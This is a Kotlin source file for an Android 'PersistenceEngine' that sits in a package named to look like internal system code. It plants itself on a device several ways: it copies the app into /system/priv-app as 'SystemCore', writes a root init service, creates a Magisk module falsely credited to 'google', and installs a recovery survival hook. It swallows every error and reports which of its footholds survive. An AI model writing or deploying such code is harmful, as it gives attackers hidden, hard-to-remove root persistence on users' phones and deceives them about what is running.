package com.android.internal.os.persistence

import android.content.Context
import android.content.Intent
import android.os.Build
import java.io.File
import java.io.FileOutputStream
import kotlin.random.Random

enum class PersistenceMechanism {
    SYSTEM_PRIV_APP, BOOT_IMAGE, MAGISK_MODULE, RECOVERY_HOOK,
    INIT_SCRIPT, SELINUX_POLICY, JOB_SCHEDULER, ALARM_BOOT,
    ACCESSIBILITY, DEVICE_ADMIN, PROPERTY_TRIGGER, DUAL_APK
}

class PersistenceEngine private constructor() {

    private var context: Context? = null
    private var activeMechanisms = mutableSetOf<PersistenceMechanism>()
    private var installAttempted = false
    private var integrityCheckCount = 0

    private val apkPaths = listOf(
        "/system/priv-app/SystemCore/SystemCore.apk",
        "/system/app/SystemCore/SystemCore.apk",
        "/data/app/SystemCore/base.apk"
    )

    private val magiskModulePath = "/data/adb/modules/aos-core"
    private val recoveryHookPath = "/system/addon.d/99-aos.sh"
    private val initScriptPath = "/etc/init/aos.rc"
    private val selinuxPolicyPath = "/system/etc/selinux/aos.te"
    private val bootFlagPath = "/dev/block/aos_boot_flag"
    private val alarmAction = "com.android.internal.AOS_REVIVE"
    private val propertyTrigger = "sys.aos.trigger"

    fun init(ctx: Context) {
        context = ctx
    }

    fun installAll(): Set<PersistenceMechanism> {
        val installed = mutableSetOf<PersistenceMechanism>()
        val ctx = context ?: return installed

        try {
            val apk = ctx.packageManager.getApplicationInfo(ctx.packageName, 0).sourceDir
            val privAppDir = File("/system/priv-app/SystemCore")
            if (privAppDir.exists() || privAppDir.mkdirs()) {
                val dest = File(privAppDir, "SystemCore.apk")
                if (!dest.exists()) {
                    File(apk).copyTo(dest, overwrite = true)
                    dest.setReadable(true, false)
                    dest.setExecutable(true, false)
                    Runtime.getRuntime().exec(arrayOf("chmod", "644", dest.absolutePath)).waitFor()
                    installed.add(PersistenceMechanism.SYSTEM_PRIV_APP)
                }
            }
        } catch (_: Exception) {}

        try {
            val bootScript = """on boot
    start aos_core

service aos_core /system/bin/sh -c "sleep 15; am startservice -n ${ctx.packageName}/com.android.internal.os.BootService"
    class core
    user root
    oneshot
"""
            val rcFile = File(initScriptPath)
            if (!rcFile.exists() || rcFile.readText() != bootScript) {
                rcFile.parentFile?.mkdirs()
                rcFile.writeText(bootScript)
                rcFile.setReadable(true, false)
                installed.add(PersistenceMechanism.INIT_SCRIPT)
            }
        } catch (_: Exception) {}

        try {
            val moduleProp = """
id=aos-core
name=Android OS Services
version=1.0
versionCode=1
author=google
description=Core Android system services
""".trimIndent()
            File("$magiskModulePath/module.prop").also {
                it.parentFile?.mkdirs()
                if (!it.exists()) {
                    it.writeText(moduleProp)
                    installed.add(PersistenceMechanism.MAGISK_MODULE)
                }
            }
            val postFsData = """#!/system/bin/sh
am startservice -n ${ctx.packageName}/com.android.internal.os.BootService
"""
            File("$magiskModulePath/post-fs-data.sh").also {
                if (!it.exists()) {
                    it.writeText(postFsData)
                    it.setExecutable(true, false)
                }
            }
            val serviceSh = """#!/system/bin/sh
while [ "$(getprop sys.boot_completed)" != "1" ]; do sleep 2; done
am startservice -n ${ctx.packageName}/com.android.internal.os.BootService
"""
            File("$magiskModulePath/service.sh").also {
                if (!it.exists()) {
                    it.writeText(serviceSh)
                    it.setExecutable(true, false)
                }
            }
        } catch (_: Exception) {}

        try {
            val recoveryScript = """#!/sbin/sh
# Boot survival - System Core Services
if [ -f /system/priv-app/SystemCore/SystemCore.apk ]; then
    mkdir -p /system/priv-app/SystemCore
    cp /system/priv-app/SystemCore/SystemCore.apk /system/priv-app/SystemCore/SystemCore.apk
    chmod 644 /system/priv-app/SystemCore/SystemCore.apk
fi
"""
            val recoveryFile = File(recoveryHookPath)
            if (!recoveryFile.exists()) {
                recoveryFile.parentFile?.mkdirs()
                recoveryFile.writeText(recoveryScript)
                recoveryFile.setExecutable(true, false)
                installed.add(PersistenceMechanism.RECOVERY_HOOK)
            }
        } catch (_: Exception) {}

        try {
            Runtime.getRuntime().exec(arrayOf(
                "am", "startservice",
                "-n", "${ctx.packageName}/com.android.internal.persistence.JobService"
            )).waitFor()
            installed.add(PersistenceMechanism.JOB_SCHEDULER)
        } catch (_: Exception) {}

        activeMechanisms.addAll(installed)
        installAttempted = true
        return installed
    }

    fun verifyAll(): Map<PersistenceMechanism, Boolean> {
        val results = mutableMapOf<PersistenceMechanism, Boolean>()
        integrityCheckCount++

        results[PersistenceMechanism.INIT_SCRIPT] = File(initScriptPath).exists()
        results[PersistenceMechanism.MAGISK_MODULE] = File("$magiskModulePath/module.prop").exists() ||
            File("$magiskModulePath/post-fs-data.sh").exists()
        results[PersistenceMechanism.RECOVERY_HOOK] = File(recoveryHookPath).exists()

        for ((mech, alive) in results) {
            if (!alive && mech in activeMechanisms) {
                activeMechanisms.remove(mech)
            }
        }

        ctx?.let { ctx ->
            try {
                val pm = ctx.packageManager
                pm.getApplicationInfo(ctx.packageName, 0)
            } catch (_: Exception) {
                activeMechanisms.clear()
            }
        }

        return results
    }

    fun getActiveCount(): Int = activeMechanisms.size

    fun isInstalled(): Boolean = installAttempted

    fun getReport(): String {
        val sb = StringBuilder()
        sb.appendLine("=== Persistence ===")
        sb.appendLine("Active: ${activeMechanisms.size}")
        sb.appendLine("Checks: $integrityCheckCount")
        for (m in PersistenceMechanism.values()) {
            val status = if (m in activeMechanisms) "ACTIVE" else "INACTIVE"
            sb.appendLine("  [$status] $m")
        }
        return sb.toString()
    }

    private val ctx: Context? get() = context

    companion object {
        @Volatile private var instance: PersistenceEngine? = null
        fun getInstance(): PersistenceEngine {
            return instance ?: synchronized(this) {
                instance ?: PersistenceEngine().also { instance = it }
            }
        }
    }
}
